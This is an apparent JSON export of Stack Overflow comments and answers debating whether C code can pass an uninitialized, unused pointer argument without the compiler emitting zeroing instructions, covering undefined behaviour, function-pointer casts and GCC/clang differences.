2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1524655592, "post_id": 50020196, "comment_id": 87057853, "body": "Would overriding the type work for you?  <code>typedef int (*func0_t)(void); return (*(func0_t)func)();</code> for paths of code that know <code>func == doesnt_use_the_ptr</code>"}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524656012, "post_id": 50020196, "comment_id": 87058130, "body": "@chux I&#39;m not sure I understand."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524656213, "post_id": 50020196, "comment_id": 87058294, "body": "@12345ieee All function pointers are cast-able to other function pointers.  With &quot; know <code>func</code> will point to a function that doesn&#39;t use the argument&quot;, then cast <code>func</code> to a  function  pointer  that needs no arguments and then call that function.<code>(*(func0_t)func)()</code>."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1524656262, "post_id": 50020196, "comment_id": 87058336, "body": "You might consider rephrasing the question because what you require is actually a way to indicate to the compiler that the argument is unused or that you really do not care about the fact that <code>unused_ptr_arg</code> is uninitialized. For example, if <code>int *unused_ptr_arg = unused_ptr_arg;</code> were a valid way to express to the compiler that you did not care what value it had, that would be an acceptable solution, even though it does not use the \u201cmagic\u201d value you request."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524656301, "post_id": 50020196, "comment_id": 87058372, "body": "@chux: The fact that function pointers can be cast to other function pointers does not mean the pointed-to function may legally be called with the converted pointer. If the pointed-to function were defined to match, it would be okay, but then the caller has to know to do the cast, and that negates benefits of having a function pointer in the first place (being able to call the function via the pointer without knowing specifically which function is called)."}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "reply_to_user": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1524656329, "post_id": 50020196, "comment_id": 87058388, "body": "@EricPostpischil yes, you interpreted it correctly. Feel free to edit it for extra clarity, I couldn&#39;t figure a better way to express my intent."}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524656416, "post_id": 50020196, "comment_id": 87058456, "body": "@chux casting function ptrs is UB of the highest degree, you are messing with the calling convention. It&#39;ll probably work for this simple case, but not for more parameters."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524656667, "post_id": 50020196, "comment_id": 87058620, "body": "@12345ieee &quot;casting function ptrs is UB&quot; is not so.  Casting is well defined.  &quot;A pointer to a function of one type may be converted to a pointer to a function of another type...&quot;  C11 &#167;6.3.2.3 8.  Calling casted function pointers may be an issue, but not the cast itself."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524657779, "post_id": 50020196, "comment_id": 87059386, "body": "@12345ieee How about another approach: In addition to the <a href=\"https://stackoverflow.com/questions/50020196/is-there-a-safe-way-to-specify-the-value-of-an-object-may-be-uninitialized-becau/50020667#comment87058294_50020196\">cast and call idea</a>, also make <code>int doesnt_use_the_ptr(int *ptr);</code> --&gt; <code>int doesnt_use_the_ptr(void);</code> and change typedef to <code>typedef int (*func_t)();</code> which does not care about argument count/types?"}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524657962, "post_id": 50020196, "comment_id": 87059525, "body": "@chux , the functions have to obey that interface for reason outside my immediate control (otherwise I would have obviously changed the signature)"}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524706139, "post_id": 50020196, "comment_id": 87083164, "body": "@Someprogrammerdude: Intel&#39;s SIMD intrinsics define do define something like a <code>_MAGIC_COMPILER_UNINITIALIZED_VALUE</code> for SIMD vector types:  <a href=\"https://software.intel.com/sites/landingpage/IntrinsicsGuide/#text=undefined_&amp;expand=5558\" rel=\"nofollow noreferrer\"><code>__m128 v = _mm_undefined_ps();</code></a>  which you might use as a destination for <code>movhlps</code>: <a href=\"https://godbolt.org/g/ucmHPN\" rel=\"nofollow noreferrer\">godbolt.org/g/ucmHPN</a>  gcc/clang typically just xor-zero a register, though; only ICC really does <code>movhlps</code> into a register with a (false) dependency on whatever the calling code was using it for.  Also interesting: <code>_mm256_castps128_ps256</code> leaves garbage in the high half."}], "answers": [{"comments": [{"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 0, "creation_date": 1524653768, "post_id": 50020415, "comment_id": 87056612, "body": "I absolutely agree that this is what I <i>should</i> do (and in fact it&#39;s what I do in real code), this question was specifically asking for a method to forego the zeroing."}, {"owner": {"reputation": 57967, "user_id": 2805305, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/442d249754d1725d9510cf06fa46b964?s=128&d=identicon&r=PG&f=1", "display_name": "bolov", "link": "https://stackoverflow.com/users/2805305/bolov"}, "reply_to_user": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 0, "creation_date": 1524653892, "post_id": 50020415, "comment_id": 87056686, "body": "@12345ieee yes, but your problem is misleading. Just by asking this you validate the ideea that zeroing is taxing, even in a small amount. What I am trying to say is that the problem you are trying to solve (even academically) doesn&#39;t exist."}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 1, "creation_date": 1524654688, "post_id": 50020415, "comment_id": 87057205, "body": "I&#39;m sure I can design a contrived example to measure the zeroing (like a function with 6+8 unused parameters), but I agree that I&#39;m creating a problem that doesn&#39;t really exist in real life. I updated the disclaimer at the top."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 2, "creation_date": 1524655709, "post_id": 50020415, "comment_id": 87057915, "body": "This answer disputes the premises of the question and does not answer it. While one might argue that the cost of zeroing is trivial, that is based on assumptions about the machines used and the purposes and circumstances of the software. I have worked on extremely high performance code where the cost of zeroing or even no-op instructions was a factor, so it is reasonable to ask questions where the cost of zeroing is significant. This answer is bad because it fails to answer the question as asked. Disputes about the premises of a question belong in comments, not answers."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 1, "creation_date": 1524699012, "post_id": 50020415, "comment_id": 87081516, "body": "A <code>nop</code> instruction still isn&#39;t free.  On x86, xor-zeroing a register costs a 2-byte instruction.  It&#39;s the cheapest possible 2-byte instruction (on Sandybridge-family), but it still decodes to 1 uop that has to go through the pipeline, and takes space in the ROB until it retires.  (Not in the out-of-order scheduler, though, on CPUs which eliminate it in the issue/rename stage.  It enters the out-of-order part of the core in an already-executed state).  Related: <a href=\"//stackoverflow.com/q/44169342\">Can x86&#39;s MOV really be &quot;free&quot;? Why can&#39;t I reproduce this at all?</a> nothing is free"}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1524699303, "post_id": 50020415, "comment_id": 87081596, "body": "Total uop throughput can easily be a bottleneck, and a zeroing instruction still costs an issue slot.  So does a <code>nop</code>; current x86 CPUs don&#39;t eliminate <code>nop</code>.  On AMD CPUs, <code>xor</code>-zeroing even uses an ALU uop, so it&#39;s not like a NOP.  See <a href=\"//stackoverflow.com/q/33666617\">What is the best way to set a register to zero in x86 assembly: xor, mov or and?</a>"}], "tags": [], "owner": {"reputation": 57967, "user_id": 2805305, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/442d249754d1725d9510cf06fa46b964?s=128&d=identicon&r=PG&f=1", "display_name": "bolov", "link": "https://stackoverflow.com/users/2805305/bolov"}, "is_accepted": false, "score": 2, "last_activity_date": 1524653495, "creation_date": 1524653495, "answer_id": 50020415, "question_id": 50020196, "link": "https://stackoverflow.com/questions/50020196/is-there-a-safe-way-to-specify-the-value-of-an-object-may-be-uninitialized-becau/50020415#50020415", "title": "Is there a safe way to specify the value of an object may be uninitialized because it is never used?", "body": "<pre><code>int *unused_ptr_arg = NULL;\n</code></pre>\n\n<p>This is what you should be doing. You don't pay for anything. Zeroing an <code>int</code> is a no-op. Ok technically it's not, but practically it is. You will never ever ever see the time of this operation in your program. And I don't mean that it's so small that you won't notice it. I mean that it's so small that so many other factors and operations that are order of magnitude longer will \"swallow\" it.</p>\n"}, {"comments": [{"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 2, "creation_date": 1524654544, "post_id": 50020667, "comment_id": 87057110, "body": "I&#39;ve tested several compilers on godbolt, most keep the zeroing of the register, and some do a <code>mov</code> from static storage, which is even worse."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 1, "creation_date": 1524654705, "post_id": 50020667, "comment_id": 87057217, "body": "but it will zero it only on the startup which  is a completely different case."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 1, "creation_date": 1524654718, "post_id": 50020667, "comment_id": 87057222, "body": "@12345ieee &quot;and some do a mov from static storage&quot; --&gt; I like to see this assembly code.  Certainty the <i>address</i> of the <code>static unused_ptr_arg</code> is &quot;moved&quot;."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 0, "creation_date": 1524655630, "post_id": 50020667, "comment_id": 87057879, "body": "@12345ieee you completely do not understand the topic. The adress of the function is know compile time and it actually is removed by the compiler as not needed. Declare the function pointer as volatile and you will see the difference. <a href=\"https://godbolt.org/g/YYDKMF\" rel=\"nofollow noreferrer\">godbolt.org/g/YYDKMF</a>"}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 3, "creation_date": 1524655908, "post_id": 50020667, "comment_id": 87058057, "body": "@PeterJ_01 declaring the function ptr as volatile only adds a ton of noise to the function call (as it should, the address has to be retrieved each time), but doesn&#39;t change at all the parameter zeroing strategy (you can check on godbolt). That&#39;s why I hardcoded it in."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524656124, "post_id": 50020667, "comment_id": 87058211, "body": "the compiler knows that you do not change this function pointer in this function and it optimizes it out - which is 100% logical and expected."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 0, "creation_date": 1524656382, "post_id": 50020667, "comment_id": 87058434, "body": "@12345ieee here you fave no volatile example - but you must make it not calculable the compile time <a href=\"https://godbolt.org/g/bDJLwu\" rel=\"nofollow noreferrer\">godbolt.org/g/bDJLwu</a>"}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524698700, "post_id": 50020667, "comment_id": 87081431, "body": "@PeterJ_01: sure, and if you add <code>static const</code> to that local array, ICC doesn&#39;t ridiculously copy it to the stack before indexing.  Then you can easily see that it still spends an instruction zeroing <code>rdi</code>, either xor-zero or a load from memory, just like this non-working answer, for gcc/clang/icc.  The OP is trying to eliminate <i>that</i> instruction and let the compiler leave whatever garbage is in RDI as the unused arg; optimizations on the function-pointer are orthogonal."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 1, "creation_date": 1524725637, "post_id": 50020667, "comment_id": 87089225, "body": "I know what OP wants. But the question why to pass the undefined variable to the function?"}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 1, "last_activity_date": 1524654551, "last_edit_date": 1524654551, "creation_date": 1524654288, "answer_id": 50020667, "question_id": 50020196, "link": "https://stackoverflow.com/questions/50020196/is-there-a-safe-way-to-specify-the-value-of-an-object-may-be-uninitialized-becau/50020667#50020667", "title": "Is there a safe way to specify the value of an object may be uninitialized because it is never used?", "body": "<p>To prevent the possibility of zero-ing with each run of <code>int foo()</code>, simply make <code>unused_ptr_arg</code> <code>static</code>.</p>\n\n<pre><code>int foo() {\n    func_t func = doesnt_use_the_ptr;\n    static int *unused_ptr_arg;    \n    return (*func)(unused_ptr_arg);\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 0, "creation_date": 1524657337, "post_id": 50021619, "comment_id": 87059071, "body": "clang does what you say, but GCC complains"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 0, "creation_date": 1524657707, "post_id": 50021619, "comment_id": 87059332, "body": "@12345ieee: In GCC, one can do <code>int *unused_ptr_arg = unused_ptr_arg;</code> to prevent it from warning about the lack of initialization (discovered by experiment, not compiler documentation). But that is unsatisfactory because GCC still generates the XOR, it is not valid C (uses an uninitialized value), and clang complains about it. I doubt you will find a single solution for all compilers, but you asked for compiler-specific solutions, so you may have to use preprocessor conditionals if you want to support multiple compilers."}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 0, "creation_date": 1524657881, "post_id": 50021619, "comment_id": 87059463, "body": "Yes, I thank you very much for the clang code, I was already prepared to an <code>ifdef</code> wall. I thought that as you quoted the standard you were about to tell me how to make this work with gcc, but a clang solution mandated by the standard is already a big step ahead."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 0, "creation_date": 1524657952, "post_id": 50021619, "comment_id": 87059518, "body": "@12345ieee: I updated the answer with another solution."}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "edited": false, "score": 0, "creation_date": 1524658144, "post_id": 50021619, "comment_id": 87059678, "body": "It does work in any compiler! Amazing! Get +1 for now, I&#39;ll accept in a day if no &quot;pure C&quot; solution comes along."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524671254, "post_id": 50021619, "comment_id": 87069098, "body": "You mask the UB and the warning by the cast. It is still the UB. This the abuse of the compiler which may lead to very well hided errors. IMO this an example what any coder should avoid. Passing the uninitialized pointer is always wrong, even if the function does not dereference it (so the question is why to pass it if it is not used).  This should be avoided as a plaque - and I see only one use in the function which will be implemented in the future to suppress the warning <a href=\"https://godbolt.org/g/j7zKyp\" rel=\"nofollow noreferrer\">godbolt.org/g/j7zKyp</a>"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 2, "creation_date": 1524672445, "post_id": 50021619, "comment_id": 87069809, "body": "@PeterJ_01: The behavior is not undefined. It is defined by GCC and Clang. You can deal with plaque at the dentist."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524673404, "post_id": 50021619, "comment_id": 87070342, "body": "@EricPostpischil of course - when the function called dereferences  the uninitialized pointer the behavior is defined by GCC and especially by Clang. LOL."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 3, "creation_date": 1524673667, "post_id": 50021619, "comment_id": 87070512, "body": "@PeterJ_01: A premise of the question is that the function does not dereference the pointer."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524673924, "post_id": 50021619, "comment_id": 87070651, "body": "Great - so why to pass it at all. Any reason? Even as the academic question.  And the trivial example with no academic meaning. It is a classical example of the compiler abuse."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 4, "creation_date": 1524675178, "post_id": 50021619, "comment_id": 87071240, "body": "@PeterJ_01: As the question states, this is one particular case of a general situation in which all functions must conform to the type <code>int (*func_t)(int *ptr)</code>. Thus <code>func_t</code> is used to hold various pointers at various times. Some of the functions do use the parameter, and so a valid value needs to be passed. Some of the functions do not use the parameter, and no particular value needs to be passed. For performance, OP wants to avoid the unnecessary initialization when it is known the parameter will not be used."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 1, "creation_date": 1524677475, "post_id": 50021619, "comment_id": 87072433, "body": "@EricPostpischil there are the correct ways of archiving it without abusing the compiler. Same pointer and magically the calling function knows if it should initialize the variable. Hmm...... Any &quot;academical&quot; examples (of course with no (even a single instruction) code penalty)?"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 1, "creation_date": 1524681049, "post_id": 50021619, "comment_id": 87074285, "body": "@PeterJ_01: Show a correct way of achieving the desired goal without abusing the compiler. As for the calling function knowing whether or not to initialize the object, there is no magic. It simply has some information about the function it is calling."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 1, "creation_date": 1524685021, "post_id": 50021619, "comment_id": 87076271, "body": "@EricPostpischil if you give the example from my previous comment I will show you the correct way. Otherwise it is a complete waste of time as I cant think any example (except this kind useless, silly and trivial examples). Provide me the real example. And first show me how without the code penalty function will know if it should initialize the variable or not. You should have this example in your mind as you wrote that the single instruction was a huge performance penalty in your code. (IMO it was an imaginary code)"}, {"owner": {"reputation": 375, "user_id": 3288954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15086b6836e265b29d9fa3ce4b8b3264?s=128&d=identicon&r=PG", "display_name": "12345ieee", "link": "https://stackoverflow.com/users/3288954/12345ieee"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 2, "creation_date": 1524686673, "post_id": 50021619, "comment_id": 87076997, "body": "@PeterJ_01 I&#39;m not sure why you are still discussing about this and wasting Eric&#39;s time. I read all the comments and he 